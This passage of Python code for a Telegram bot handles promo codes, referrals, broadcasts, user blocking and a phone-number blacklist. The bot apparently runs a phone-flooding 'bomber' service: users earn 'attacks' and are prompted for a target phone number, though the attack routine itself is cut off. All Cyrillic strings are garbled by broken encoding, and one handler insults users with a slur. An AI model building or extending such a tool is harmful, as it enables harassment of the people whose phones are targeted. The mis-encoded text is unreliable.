        await message.answer("–ù–µ–¥–æ—Å—Ç–∞—Ç–æ—á–Ω–æ –ø—Ä–∞–≤.")

# –ü–†–û–ú–û–ö–û–î–´ - –ü–û–õ–¨–ó–û–í–ê–¢–ï–õ–ò

@dp.message_handler(text='–ü—Ä–æ–º–æ–∫–æ–¥ üéÅ')
async def promo_handler(message: types.Message):
    # –ü–µ—Ä–µ–≤—ñ—Ä—è—î–º–æ, —â–æ –ø–æ–≤—ñ–¥–æ–º–ª–µ–Ω–Ω—è –∑ –æ—Å–æ–±–∏—Å—Ç–æ–≥–æ —á–∞—Ç—É
    if message.chat.type != 'private':
        return
    
    user_id = message.from_user.id
    
    if not await user_exists(user_id):
        await message.answer("–î–ª—è –≤–∏–∫–æ—Ä–∏—Å—Ç–∞–Ω–Ω—è –±–æ—Ç–∞ –ø–æ—Ç—Ä—ñ–±–Ω–æ –Ω–∞—Ç–∏—Å–Ω—É—Ç–∏ /start")
        return
    
    async with db_pool.acquire() as conn:
        result = await conn.fetchrow("SELECT block FROM users WHERE user_id = $1", user_id)
    
    if result and result['block'] == 1:
        await message.answer("–í–∞—Å –∑–∞–±–ª–æ–∫–æ–≤–∞–Ω–æ —ñ –≤–∏ –Ω–µ –º–æ–∂–µ—Ç–µ –∫–æ—Ä–∏—Å—Ç—É–≤–∞—Ç–∏—Å—è –±–æ—Ç–æ–º.")
        return

    if not await check_subscription_status(user_id):
        await message.answer("–í–∏ –≤—ñ–¥–ø–∏—Å–∞–ª–∏—Å—è –≤—ñ–¥ –∫–∞–Ω–∞–ª—É. –ü—ñ–¥–ø–∏—à—ñ—Ç—å—Å—è, —â–æ–± –ø—Ä–æ–¥–æ–≤–∂–∏—Ç–∏ –≤–∏–∫–æ—Ä–∏—Å—Ç–∞–Ω–Ω—è –±–æ—Ç–∞.", reply_markup=checkSubMenu)
        return
    
    await Dialog.enter_promo.set()
    await message.answer("üéÅ –í–≤–µ–¥–∏—Ç–µ –ø—Ä–æ–º–æ–∫–æ–¥:")

@dp.message_handler(state=Dialog.enter_promo)
async def process_promo(message: Message, state: FSMContext):
    user_id = message.from_user.id
    promo_code = message.text.strip().upper()
    
    async with db_pool.acquire() as conn:
        # –ü–µ—Ä–µ–≤—ñ—Ä—è—î–º–æ —ñ—Å–Ω—É–≤–∞–Ω–Ω—è —Ç–∞ –∞–∫—Ç–∏–≤–Ω—ñ—Å—Ç—å –ø—Ä–æ–º–æ–∫–æ–¥—É
        promo = await conn.fetchrow('''
            SELECT * FROM promocodes 
            WHERE code = $1 AND is_active = TRUE AND valid_until > $2
        ''', promo_code, datetime.now())
        
        if not promo:
            await message.answer("‚ùå –ü—Ä–æ–º–æ–∫–æ–¥ –Ω–µ–¥–µ–π—Å—Ç–≤–∏—Ç–µ–ª–µ–Ω –∏–ª–∏ –∏—Å—Ç–µ–∫ —Å—Ä–æ–∫ –µ–≥–æ –¥–µ–π—Å—Ç–≤–∏—è.")
            await state.finish()
            return
        
        # –ü–µ—Ä–µ–≤—ñ—Ä—è—î–º–æ, —á–∏ –Ω–µ –≤–∏–∫–æ—Ä–∏—Å—Ç–æ–≤—É–≤–∞–≤ –∫–æ—Ä–∏—Å—Ç—É–≤–∞—á –≤–∂–µ —Ü–µ–π –ø—Ä–æ–º–æ–∫–æ–¥
        already_used = await conn.fetchval('''
            SELECT 1 FROM promo_activations 
            WHERE user_id = $1 AND promo_code = $2
        ''', user_id, promo_code)
        
        if already_used:
            await message.answer("‚ùå –í–∏ –≤–∂–µ –≤–∏–∫–æ—Ä–∏—Å—Ç–∞–ª–∏ —Ü–µ–π –ø—Ä–æ–º–æ–∫–æ–¥.")
            await state.finish()
            return
        
        # –ê–∫—Ç–∏–≤–∏—Ä—É–µ–º –ø—Ä–æ–º–æ–∫–æ–¥
        expires_at = datetime.now() + timedelta(hours=24)
        
        await conn.execute('''
            INSERT INTO promo_activations (user_id, promo_code, expires_at, attacks_added)
            VALUES ($1, $2, $3, $4)
        ''', user_id, promo_code, expires_at, promo['attacks_count'])
        
        # –î–æ–¥–∞—î–º–æ –∞—Ç–∞–∫–∏ –∫–æ—Ä–∏—Å—Ç—É–≤–∞—á—É
        await conn.execute('''
            UPDATE users SET promo_attacks = promo_attacks + $1 WHERE user_id = $2
        ''', promo['attacks_count'], user_id)
    
    await message.answer(
        f"üéâ –ü—Ä–æ–º–æ–∫–æ–¥ —É—Å–ø–µ—à–Ω–æ –∞–∫—Ç–∏–≤–∏—Ä–æ–≤–∞–Ω!\n\n"
        f"‚öîÔ∏è –î–æ–±–∞–≤–ª–µ–Ω–æ –∞—Ç–∞–∫: {promo['attacks_count']}\n"
        f"‚è∞ –î–µ–π—Å—Ç–≤—É–µ—Ç –¥–æ: {expires_at.strftime('%d.%m.%Y %H:%M')}\n\n"
        f"üí° –ê—Ç–∞–∫–∏ –æ—Ç –ø—Ä–æ–º–æ–∫–æ–¥–∞ —Å–≥–æ—Ä—è—Ç –ø—Ä–∏ —Å–ª–µ–¥—É—é—â–µ–π –µ–∂–µ–¥–Ω–µ–≤–Ω–æ–π —Ä–∞–∑–¥–∞—á–µ –∞—Ç–∞–∫.",
        parse_mode='HTML'
    )
    
    await state.finish()

# –û—Å—Ç–∞–ª—å–Ω—ã–µ –æ–±—Ä–∞–±–æ—Ç—á–∏–∫–∏...

@dp.message_handler(text="–°—Ç–∞—Ç–∏—Å—Ç–∏–∫–∞ –±–æ—Ç–∞")
async def bot_stats(message: Message):
    if message.from_user.id in ADMIN:
        async with db_pool.acquire() as conn:
            # –û—Ç—Ä–∏–º—É—î–º–æ –∑–∞–≥–∞–ª—å–Ω—É –∫—ñ–ª—å–∫—ñ—Å—Ç—å –∫–æ—Ä–∏—Å—Ç—É–≤–∞—á—ñ–≤
            total_users = await conn.fetchval('SELECT COUNT(*) FROM users')
            
            # –û—Ç—Ä–∏–º—É—î–º–æ –∫—ñ–ª—å–∫—ñ—Å—Ç—å –∞–∫—Ç–∏–≤–Ω–∏—Ö –∫–æ—Ä–∏—Å—Ç—É–≤–∞—á—ñ–≤ (—Ç–∏—Ö, —Ö—Ç–æ –Ω–µ –∑–∞–±–ª–æ–∫—É–≤–∞–≤ –±–æ—Ç–∞)
            active_users = 0
            users = await conn.fetch('SELECT user_id FROM users')
            
            for user in users:
                try:
                    # –ü–µ—Ä–µ–≤—ñ—Ä—è—î–º–æ, —á–∏ –º–æ–∂–µ –±–æ—Ç –Ω–∞–¥—ñ—Å–ª–∞—Ç–∏ –ø–æ–≤—ñ–¥–æ–º–ª–µ–Ω–Ω—è –∫–æ—Ä–∏—Å—Ç—É–≤–∞—á—É
                    await bot.send_chat_action(user['user_id'], 'typing')
                    active_users += 1
                except (BotBlocked, UserDeactivated, ChatNotFound):
                    continue
                except Exception as e:
                    logging.error(f"–û—à–∏–±–∫–∞ –ø—Ä–∏ –ø—Ä–æ–≤–µ—Ä–∫–µ –ø–æ–ª—å–∑–æ–≤–∞—Ç–µ–ª—è {user['user_id']}: {e}")
                    continue
            
            # –û—Ç—Ä–∏–º—É—î–º–æ –∫—ñ–ª—å–∫—ñ—Å—Ç—å –∑–∞–±–ª–æ–∫–æ–≤–∞–Ω–∏—Ö –∫–æ—Ä–∏—Å—Ç—É–≤–∞—á—ñ–≤
            blocked_users = await conn.fetchval('SELECT COUNT(*) FROM users WHERE block = 1')
            
            # –û—Ç—Ä–∏–º—É—î–º–æ –∫—ñ–ª—å–∫—ñ—Å—Ç—å –∫–æ—Ä–∏—Å—Ç—É–≤–∞—á—ñ–≤ –∑ —Ä–µ—Ñ–µ—Ä–∞–ª–∞–º–∏
            users_with_referrals = await conn.fetchval('SELECT COUNT(*) FROM users WHERE referral_count > 0')
            
            # –û—Ç—Ä–∏–º—É—î–º–æ –∑–∞–≥–∞–ª—å–Ω—É –∫—ñ–ª—å–∫—ñ—Å—Ç—å —Ä–µ—Ñ–µ—Ä–∞–ª—ñ–≤
            total_referrals = await conn.fetchval('SELECT COUNT(*) FROM referrals')
            
            # –û—Ç—Ä–∏–º—É—î–º–æ –∫—ñ–ª—å–∫—ñ—Å—Ç—å –∫–æ—Ä–∏—Å—Ç—É–≤–∞—á—ñ–≤, —è–∫—ñ –¥–æ—Å—è–≥–ª–∏ 20 —Ä–µ—Ñ–µ—Ä–∞–ª—ñ–≤
            vip_users = await conn.fetchval('SELECT COUNT(*) FROM users WHERE referral_count >= 20')
            
            # –°—Ç–∞—Ç–∏—Å—Ç–∏–∫–∞ –ø—Ä–æ–º–æ–∫–æ–¥–æ–≤
            total_promos = await conn.fetchval('SELECT COUNT(*) FROM promocodes')
            active_promos = await conn.fetchval('SELECT COUNT(*) FROM promocodes WHERE is_active = TRUE AND valid_until > $1', datetime.now())
            promo_activations = await conn.fetchval('SELECT COUNT(*) FROM promo_activations')
        
        message_text = (
            f"üìä <b>–°—Ç–∞—Ç–∏—Å—Ç–∏–∫–∞ –±–æ—Ç–∞</b>\n\n"
            f"üë• –í—Å–µ–≥–æ –ø–æ–ª—å–∑–æ–≤–∞—Ç–µ–ª–µ–π: {total_users}\n"
            f"‚úÖ –ê–∫—Ç–∏–≤–Ω—ã—Ö –ø–æ–ª—å–∑–æ–≤–∞—Ç–µ–ª–µ–π: {active_users}\n"
            f"üö´ –ó–∞–±–ª–æ–∫–∏—Ä–æ–≤–∞–Ω–Ω—ã—Ö –ø–æ–ª—å–∑–æ–≤–∞—Ç–µ–ª–µ–π: {blocked_users}\n"
            f"üìà –ü–æ–ª—å–∑–æ–≤–∞—Ç–µ–ª–µ–π —Å —Ä–µ—Ñ–µ—Ä–∞–ª–∞–º–∏: {users_with_referrals}\n"
            f"üîó –í—Å–µ–≥–æ —Ä–µ—Ñ–µ—Ä–∞–ª–æ–≤: {total_referrals}\n"
            f"‚≠ê VIP –ø–æ–ª—å–∑–æ–≤–∞—Ç–µ–ª–µ–π (20+ —Ä–µ—Ñ–µ—Ä–∞–ª–æ–≤): {vip_users}\n\n"
            f"üéÅ <b>–ü—Ä–æ–º–æ–∫–æ–¥—ã:</b>\n"
            f"üìã –í—Å–µ–≥–æ —Å–æ–∑–¥–∞–Ω–æ: {total_promos}\n"
            f"üü¢ –ê–∫—Ç–∏–≤–Ω—ã—Ö: {active_promos}\n"
            f"‚ú® –ê–∫—Ç–∏–≤–∞—Ü–∏–π: {promo_activations}"
        )
        
        await message.answer(message_text, parse_mode="HTML")
    else:
        await message.answer("–ù–µ–¥–æ—Å—Ç–∞—Ç–æ—á–Ω–æ –ø—Ä–∞–≤.")

@dp.message_handler(text='–û—Ç–ø—Ä–∞–≤–∏—Ç—å —Å–æ–æ–±—â–µ–Ω–∏–µ –ø–æ–ª—å–∑–æ–≤–∞—Ç–µ–ª—è–º')
async def broadcast_prompt(message: Message):
    if message.from_user.id in ADMIN:
        await Dialog.spam.set()
        await message.answer('–í–≤–µ–¥–∏—Ç–µ —Å–æ–æ–±—â–µ–Ω–∏–µ –¥–ª—è –ø–æ–ª—å–∑–æ–≤–∞—Ç–µ–ª–µ–π:')

@dp.message_handler(state=Dialog.spam, content_types=[types.ContentType.TEXT, types.ContentType.PHOTO, types.ContentType.VIDEO, types.ContentType.DOCUMENT])
async def broadcast_message(message: Message, state: FSMContext):
    text = message.text if message.text else ""
    content_type = "text" if message.text else "unknown"

    if message.photo:
        content_type = "photo"
        photo_id = message.photo[-1].file_id
    elif message.video:
        content_type = "video"
        video_id = message.video.file_id
    elif message.document:
        content_type = "document"
        document_id = message.document.file_id

    async with db_pool.acquire() as conn:
        users = await conn.fetch('SELECT user_id FROM users')
    
    success_count = 0
    error_count = 0

    for user in users:
        user_id = user['user_id']
        try:
            if content_type == "text":
                await bot.send_message(user_id, text)
            elif content_type == "photo":
                await bot.send_photo(user_id, photo_id, caption=text)
            elif content_type == "video":
                await bot.send_video(user_id, video_id, caption=text)
            elif content_type == "document":
                await bot.send_document(user_id, document_id, caption=text)
            success_count += 1
        except BotBlocked:
            logging.error(f"–ë–æ—Ç –∑–∞–±–ª–æ–∫–∏—Ä–æ–≤–∞–Ω –ø–æ–ª—å–∑–æ–≤–∞—Ç–µ–ª–µ–º {user_id}. –ü—Ä–æ–ø—É—Å–∫–∞–µ–º –µ–≥–æ.")
            error_count += 1
        except UserDeactivated:
            logging.error(f"–ü–æ–ª—å–∑–æ–≤–∞—Ç–µ–ª—å {user_id} –¥–µ–∞–∫—Ç–∏–≤–∏—Ä–æ–≤–∞–ª –∞–∫–∫–∞—É–Ω—Ç. –ü—Ä–æ–ø—É—Å–∫–∞–µ–º –µ–≥–æ.")
            error_count += 1
        except ChatNotFound:
            logging.error(f"–ß–∞—Ç —Å –ø–æ–ª—å–∑–æ–≤–∞—Ç–µ–ª–µ–º {user_id} –Ω–µ –Ω–∞–π–¥–µ–Ω. –ü—Ä–æ–ø—É—Å–∫–∞–µ–º –µ–≥–æ.")
            error_count += 1
        except Exception as e:
            logging.error(f"–û—à–∏–±–∫–∞ –ø—Ä–∏ –æ—Ç–ø—Ä–∞–≤–∫–µ —Å–æ–æ–±—â–µ–Ω–∏—è –ø–æ–ª—å–∑–æ–≤–∞—Ç–µ–ª—é {user_id}: {str(e)}")
            error_count += 1

    await message.answer(f'–°–æ–æ–±—â–µ–Ω–∏–µ –æ—Ç–ø—Ä–∞–≤–ª–µ–Ω–æ!\n–£—Å–ø–µ—à–Ω–æ: {success_count}\n–û—à–∏–±–æ–∫: {error_count}')
    await state.finish()

@dp.message_handler(commands=['block'])
async def add_to_blacklist(message: Message):
    args = message.get_args()
    
    if not args:
        await message.answer("–ë—É–¥—å –ª–∞—Å–∫–∞, –≤–≤–µ–¥—ñ—Ç—å –Ω–æ–º–µ—Ä —Ç–µ–ª–µ—Ñ–æ–Ω—É –¥–ª—è –¥–æ–¥–∞–≤–∞–Ω–Ω—è –¥–æ —á–æ—Ä–Ω–æ–≥–æ —Å–ø–∏—Å–∫—É.\n–ü—Ä–∏–∫–ª–∞–¥: /block 380XXXXXXXXX")
        return
    
    phone = args.strip()
    
    if not re.match(r"^\d{12}$", phone):
        await message.answer("–ù–æ–º–µ—Ä –ø–æ–≤–∏–Ω–µ–Ω –±—É—Ç–∏ —Ñ–æ—Ä–º–∞—Ç—É: 380–•–•–•–•–•–•–•–•–•. –ë—É–¥—å –ª–∞—Å–∫–∞, –≤–≤–µ–¥—ñ—Ç—å –Ω–æ–º–µ—Ä –ø–æ–≤—Ç–æ—Ä–Ω–æ.")
        return

    try:
        async with db_pool.acquire() as conn:
            await conn.execute("INSERT INTO blacklist (phone_number) VALUES ($1) ON CONFLICT DO NOTHING", phone)
        await message.answer(f"–ù–æ–º–µ—Ä {phone} –¥–æ–±–∞–≤–ª–µ–Ω –≤ —á–µ—Ä–Ω—ã–π —Å–ø–∏—Å–æ–∫.")
    except Exception as e:
        await message.answer("–°—Ç–∞–ª–∞—Å—è –ø–æ–º–∏–ª–∫–∞ –ø—Ä–∏ –¥–æ–¥–∞–≤–∞–Ω–Ω—ñ –Ω–æ–º–µ—Ä–∞ –¥–æ —á–æ—Ä–Ω–æ–≥–æ —Å–ø–∏—Å–∫—É.")
        print(f"–û—à–∏–±–∫–∞: {e}")

@dp.message_handler(commands=['nonstart'])
async def nonstart(message: Message):
    empty_keyboard = types.ReplyKeyboardMarkup(resize_keyboard=True)
    await message.answer("–Ø –∂–µ —Å–∫–∞–∑–∞–ª –Ω–µ –Ω–∞–∂–∏–º–∞—Ç—å, –¥–∞—É–Ω...", reply_markup=empty_keyboard)


@dp.message_handler(text="–ó–∞–±–ª–æ–∫–∏—Ä–æ–≤–∞—Ç—å –ø–æ–ª—å–∑–æ–≤–∞—Ç–µ–ª—è")
async def block_user(message: Message):
    if message.from_user.id in ADMIN:
        await message.answer("–í–≤–µ–¥–∏—Ç–µ ID –ø–æ–ª—å–∑–æ–≤–∞—Ç–µ–ª—è –¥–ª—è –±–ª–æ–∫–∏—Ä–æ–≤–∫–∏:")
        await Dialog.block_user.set()

@dp.message_handler(state=Dialog.block_user)
async def process_block(message: Message, state: FSMContext):
    user_id = message.text
    if user_id.isdigit():
        user_id = int(user_id)
        async with db_pool.acquire() as conn:
            await conn.execute("UPDATE users SET block = $1 WHERE user_id = $2", 1, user_id)
        await message.answer(f"–ü–æ–ª—å–∑–æ–≤–∞—Ç–µ–ª—å —Å ID {user_id} –∑–∞–±–ª–æ–∫–∏—Ä–æ–≤–∞–Ω.")
    else:
        await message.answer("–ù–µ–∫–æ—Ä–µ–∫—Ç–Ω–∏–π ID –∫–æ—Ä–∏—Å—Ç—É–≤–∞—á–∞. –ë—É–¥—å –ª–∞—Å–∫–∞, –≤–≤–µ–¥—ñ—Ç—å —á–∏—Å–ª–æ–≤–∏–π ID.")
    await state.finish()

@dp.message_handler(text="–†–∞–∑–±–ª–æ–∫–∏—Ä–æ–≤–∞—Ç—å –ø–æ–ª—å–∑–æ–≤–∞—Ç–µ–ª—è")
async def unblock_user(message: Message):
    if message.from_user.id in ADMIN:
        await message.answer("–í–≤–µ–¥–∏—Ç–µ ID –ø–æ–ª—å–∑–æ–≤–∞—Ç–µ–ª—è –¥–ª—è —Ä–∞–∑–±–ª–æ–∫–∏—Ä–æ–≤–∫–∏:")
        await Dialog.unblock_user.set()

@dp.message_handler(state=Dialog.unblock_user)
async def process_unblock(message: Message, state: FSMContext):
    user_id = message.text
    if user_id.isdigit():
        user_id = int(user_id)
        async with db_pool.acquire() as conn:
            await conn.execute("UPDATE users SET block = $1 WHERE user_id = $2", 0, user_id)
        await message.answer(f"–ü–æ–ª—å–∑–æ–≤–∞—Ç–µ–ª—å —Å ID {user_id} —Ä–∞–∑–±–ª–æ–∫–∏—Ä–æ–≤–∞–Ω.")
    else:
        await message.answer("–ù–µ–∫–æ—Ä–µ–∫—Ç–Ω–∏–π ID –∫–æ—Ä–∏—Å—Ç—É–≤–∞—á–∞. –ë—É–¥—å –ª–∞—Å–∫–∞, –≤–≤–µ–¥—ñ—Ç—å —á–∏—Å–ª–æ–≤–∏–π ID.")
    await state.finish()

@dp.message_handler(text="–†–µ—Ñ–µ—Ä–∞–ª—ã")
async def show_referrals(message: Message):
    if message.from_user.id in ADMIN:
        async with db_pool.acquire() as conn:
            referrals = await conn.fetch('''
                SELECT user_id, name, username, referral_count 
                FROM users 
                WHERE referral_count > 0 
                ORDER BY referral_count DESC
            ''')
        
        if not referrals:
            await message.answer("–ü–æ–∫–∞ –Ω–µ—Ç –ø–æ–ª—å–∑–æ–≤–∞—Ç–µ–ª–µ–π —Å —Ä–µ—Ñ–µ—Ä–∞–ª–∞–º–∏.")
            return
        
        message_text = "üë• <b>–ü–æ–ª—å–∑–æ–≤–∞—Ç–µ–ª–∏ —Å —Ä–µ—Ñ–µ—Ä–∞–ª–∞–º–∏:</b>\n\n"
        
        for ref in referrals:
            user_id = ref['user_id']
            name = ref['name'] or "–ë–µ–∑ –∏–º–µ–Ω–∏"
            username = ref['username'] or "–ë–µ–∑ username"
            count = ref['referral_count']
            
            message_text += f"‚Ä¢ <a href='tg://user?id={user_id}'>{name}</a> (@{username})\n"
            message_text += f"  ‚îî –ö–æ–ª–∏—á–µ—Å—Ç–≤–æ —Ä–µ—Ñ–µ—Ä–∞–ª–æ–≤: {count}\n\n"
        
        await message.answer(message_text, parse_mode="HTML")
    else:
        await message.answer("–ù–µ–¥–æ—Å—Ç–∞—Ç–æ—á–Ω–æ –ø—Ä–∞–≤.")

@dp.message_handler(text="–ù–∞–∑–∞–¥")
async def back_to_admin_menu(message: Message):
    if message.from_user.id in ADMIN:
        await message.answer('–í–≤–µ–¥–∏—Ç–µ –Ω–æ–º–µ—Ä —Ç–µ–ª–µ—Ñ–æ–Ω–∞.\n–ü—Ä–∏–º–µ—Ä:\n<i>üá∫üá¶380xxxxxxxxx</i>', parse_mode="html", reply_markup=profile_keyboard)
    else:
        await message.answer('–í–∏ –Ω–µ —î –∞–¥–º—ñ–Ω–æ–º.')

@dp.message_handler(text='üÜò –î–æ–ø–æ–º–æ–≥–∞')
@dp.throttled(anti_flood, rate=3)
async def help(message: types.Message):
    # –ü–µ—Ä–µ–≤—ñ—Ä—è—î–º–æ, —â–æ –ø–æ–≤—ñ–¥–æ–º–ª–µ–Ω–Ω—è –∑ –æ—Å–æ–±–∏—Å—Ç–æ–≥–æ —á–∞—Ç—É
    if message.chat.type != 'private':
        return
    
    user_id = message.from_user.id
    
    if not await user_exists(user_id):
        await message.answer("–î–ª—è –≤–∏–∫–æ—Ä–∏—Å—Ç–∞–Ω–Ω—è –±–æ—Ç–∞ –ø–æ—Ç—Ä—ñ–±–Ω–æ –Ω–∞—Ç–∏—Å–Ω—É—Ç–∏ /start")
        return
    
    async with db_pool.acquire() as conn:
        result = await conn.fetchrow("SELECT block FROM users WHERE user_id = $1", user_id)
    
    if result and result['block'] == 1:
        await message.answer("–í–∞—Å –∑–∞–±–ª–æ–∫–æ–≤–∞–Ω–æ —ñ –≤–∏ –Ω–µ –º–æ–∂–µ—Ç–µ –∫–æ—Ä–∏—Å—Ç—É–≤–∞—Ç–∏—Å—è –±–æ—Ç–æ–º.")
        return

    if not await check_subscription_status(user_id):
        await message.answer("–í–∏ –≤—ñ–¥–ø–∏—Å–∞–ª–∏—Å—è –≤—ñ–¥ –∫–∞–Ω–∞–ª—É. –ü—ñ–¥–ø–∏—à—ñ—Ç—å—Å—è, —â–æ–± –ø—Ä–æ–¥–æ–≤–∂–∏—Ç–∏ –≤–∏–∫–æ—Ä–∏—Å—Ç–∞–Ω–Ω—è –±–æ—Ç–∞.", reply_markup=checkSubMenu)
        return
    
    inline_keyboard = types.InlineKeyboardMarkup()
    code_sub = types.InlineKeyboardButton(text='üé™ –ö–∞–Ω–∞–ª', url='https://t.me/+tod0WSFEpEQ2ODcy')
    inline_keyboard = inline_keyboard.add(code_sub)
    await bot.send_message(message.chat.id, "–í–∏–Ω–∏–∫–ª–∏ –ø–∏—Ç–∞–Ω–Ω—è? –ó–≤–µ—Ä—Ç–∞–π—Å—è –¥–æ @ABOBA", disable_web_page_preview=True, parse_mode="HTML", reply_markup=inline_keyboard)


@dp.message_handler(text='üé™ –ó–∞–ø—Ä–æ—Å–∏—Ç–∏ –¥—Ä—É–≥–∞')
async def referral_program(message: types.Message):
    # –ü–µ—Ä–µ–≤—ñ—Ä—è—î–º–æ, —â–æ –ø–æ–≤—ñ–¥–æ–º–ª–µ–Ω–Ω—è –∑ –æ—Å–æ–±–∏—Å—Ç–æ–≥–æ —á–∞—Ç—É
    if message.chat.type != 'private':
        return
    
    user_id = message.from_user.id
    
    if not await user_exists(user_id):
        await message.answer("–î–ª—è –≤–∏–∫–æ—Ä–∏—Å—Ç–∞–Ω–Ω—è –±–æ—Ç–∞ –ø–æ—Ç—Ä—ñ–±–Ω–æ –Ω–∞—Ç–∏—Å–Ω—É—Ç–∏ /start")
        return
    
    async with db_pool.acquire() as conn:
        result = await conn.fetchrow("SELECT block FROM users WHERE user_id = $1", user_id)
    
    if result and result['block'] == 1:
        await message.answer("–í–∞—Å –∑–∞–±–ª–æ–∫–æ–≤–∞–Ω–æ —ñ –≤–∏ –Ω–µ –º–æ–∂–µ—Ç–µ –∫–æ—Ä–∏—Å—Ç—É–≤–∞—Ç–∏—Å—è –±–æ—Ç–æ–º.")
        return
    
    if not await check_subscription_status(user_id):
        await message.answer("–í–∏ –≤—ñ–¥–ø–∏—Å–∞–ª–∏—Å—è –≤—ñ–¥ –∫–∞–Ω–∞–ª—É. –ü—ñ–¥–ø–∏—à—ñ—Ç—å—Å—è, —â–æ–± –ø—Ä–æ–¥–æ–≤–∂–∏—Ç–∏ –≤–∏–∫–æ—Ä–∏—Å—Ç–∞–Ω–Ω—è –±–æ—Ç–∞.", reply_markup=checkSubMenu)
        return
    
    async with db_pool.acquire() as conn:
        referral_data = await conn.fetchrow(
            'SELECT referral_count, referral_attacks, unused_referral_attacks FROM users WHERE user_id = $1',
            user_id
        )
        
        referral_count = referral_data['referral_count'] if referral_data else 0
        referral_attacks = referral_data['referral_attacks'] if referral_data else 0
        unused_referral_attacks = referral_data['unused_referral_attacks'] if referral_data else 0
        
        referral_total = referral_attacks + unused_referral_attacks
        
        bot_username = (await bot.me).username
        referral_link = f"https://t.me/{bot_username}?start={user_id}"
        
        referrals = await conn.fetch(
            'SELECT u.user_id, u.name, u.username, r.join_date FROM referrals r JOIN users u ON r.referred_id = u.user_id WHERE r.referrer_id = $1 ORDER BY r.join_date DESC',
            user_id
        )
    
    message_text = f"üé™ <b>–ó–∞–ø—Ä–æ—Å–∏—Ç–∏ –¥—Ä—É–≥–∞</b>\n\n"
    message_text += f"üîó –í–∞—à–µ –ø–æ—Å–∏–ª–∞–Ω–Ω—è –¥–ª—è –¥—Ä—É–≥–∞:\n<code>{referral_link}</code>\n\n"
    message_text += "üí° <b>–Ø–∫ —Ü–µ –ø—Ä–∞—Ü—é—î?</b>\n"
    message_text += "‚Ä¢ üéØ –ü–æ–¥—ñ–ª–∏—Å—è –ø–æ—Å–∏–ª–∞–Ω–Ω—è–º –∑ –¥—Ä—É–≥–æ–º\n"
    message_text += "‚Ä¢ üéâ –ö–æ–ª–∏ –¥—Ä—É–≥ –ø—ñ–¥–ø–∏—à–µ—Ç—å—Å—è –Ω–∞ –∫–∞–Ω–∞–ª ‚Äî –≤—ñ–Ω —Å—Ç–∞–Ω–µ —á–∞—Å—Ç–∏–Ω–æ—é –Ω–∞—à–æ—ó —Å–ø—ñ–ª—å–Ω–æ—Ç–∏\n"
    message_text += "‚Ä¢ üöÄ –ó–∞–≤–¥—è–∫–∏ —Ç–æ–±—ñ –º–∏ –∑–º–æ–∂–µ–º–æ –∑—Ä–æ—Å—Ç–∞—Ç–∏ —Ç–∞ —Ä–æ–±–∏—Ç–∏ –¥–ª—è —Ç–µ–±–µ —â–µ –±—ñ–ª—å—à–µ\n\n"
    
    if referrals:
        message_text += f"üìä <b>–°—Ç–∞—Ç–∏—Å—Ç–∏–∫–∞:</b>\n"
        message_text += f"‚îú –í—Å–µ–≥–æ —Ä–µ—Ñ–µ—Ä–∞–ª–æ–≤: {referral_count}\n"
        message_text += f"‚îú –î–æ—Å—Ç—É–ø–Ω–æ –∞—Ç–∞–∫ –æ—Ç —Ä–µ—Ñ–µ—Ä–∞–ª–æ–≤: {referral_total}\n"
        if unused_referral_attacks > 0:
            message_text += f"‚îî –ù–∞–∫–æ–ø–∏—á–µ–Ω–æ –∞—Ç–∞–∫: {unused_referral_attacks}\n"
        message_text += f"\n<b>–í–∞—à—ñ —Ä–µ—Ñ–µ—Ä–∞–ª–∏:</b>\n"
        for ref in referrals:
            ref_name = ref['username'] or ref['name'] or f"User{ref['user_id']}"
            message_text += f"‚Ä¢ <a href='tg://user?id={ref['user_id']}'>{ref_name}</a> - {ref['join_date'].strftime('%d.%m.%Y')}\n"
    
    keyboard = InlineKeyboardMarkup()
    share_text = "–ü—Ä–∏–≤—ñ—Ç! –ü—Ä–∏—î–¥–Ω—É–π—Å—è –¥–æ –Ω–∞—à–æ–≥–æ –±–æ—Ç—É! üì± –ó–∞–≤–¥—è–∫–∏ —Ç–æ–±—ñ –º–∏ –∑–º–æ–∂–µ–º–æ –∑—Ä–æ—Å—Ç–∞—Ç–∏ —Ç–∞ —Ä–æ–±–∏—Ç–∏ –¥–ª—è —Ç–µ–±–µ —â–µ –±—ñ–ª—å—à–µ üöÄ"
    encoded_text = urllib.parse.quote(share_text)
    share_url = f"https://t.me/share/url?url={referral_link}&text={encoded_text}"
    keyboard.add(InlineKeyboardButton("üéØ –ü–æ–¥—ñ–ª–∏—Ç–∏—Å—è –ø–æ—Å–∏–ª–∞–Ω–Ω—è–º", url=share_url))
    
    await message.answer(message_text, parse_mode='HTML', reply_markup=keyboard)

@dp.message_handler(text='üéØ –ü–æ—á–∞—Ç–∏ –∞—Ç–∞–∫—É')
async def start_attack_prompt(message: Message):
    # –ü–µ—Ä–µ–≤—ñ—Ä—è—î–º–æ, —â–æ –ø–æ–≤—ñ–¥–æ–º–ª–µ–Ω–Ω—è –∑ –æ—Å–æ–±–∏—Å—Ç–æ–≥–æ —á–∞—Ç—É
    if message.chat.type != 'private':
        return  # –Ü–≥–Ω–æ—Ä—É—î–º–æ –ø–æ–≤—ñ–¥–æ–º–ª–µ–Ω–Ω—è –∑ –≥—Ä—É–ø
    
    user_id = message.from_user.id
    
    if not await user_exists(user_id):
        await message.answer("–î–ª—è –≤–∏–∫–æ—Ä–∏—Å—Ç–∞–Ω–Ω—è –±–æ—Ç–∞ –ø–æ—Ç—Ä—ñ–±–Ω–æ –Ω–∞—Ç–∏—Å–Ω—É—Ç–∏ /start")
        return
    
    async with db_pool.acquire() as conn:
        result = await conn.fetchrow("SELECT block FROM users WHERE user_id = $1", user_id)
    
    if result and result['block'] == 1:
        await message.answer("–í–∞—Å –∑–∞–±–ª–æ–∫–æ–≤–∞–Ω–æ —ñ –≤–∏ –Ω–µ –º–æ–∂–µ—Ç–µ –∫–æ—Ä–∏—Å—Ç—É–≤–∞—Ç–∏—Å—è –±–æ—Ç–æ–º.")
        return
    
    if not await check_subscription_status(user_id):
        await message.answer("–í–∏ –≤—ñ–¥–ø–∏—Å–∞–ª–∏—Å—è –≤—ñ–¥ –∫–∞–Ω–∞–ª—É. –ü—ñ–¥–ø–∏—à—ñ—Ç—å—Å—è, —â–æ–± –ø—Ä–æ–¥–æ–≤–∂–∏—Ç–∏ –≤–∏–∫–æ—Ä–∏—Å—Ç–∞–Ω–Ω—è –±–æ—Ç–∞.", reply_markup=checkSubMenu)
        return
    
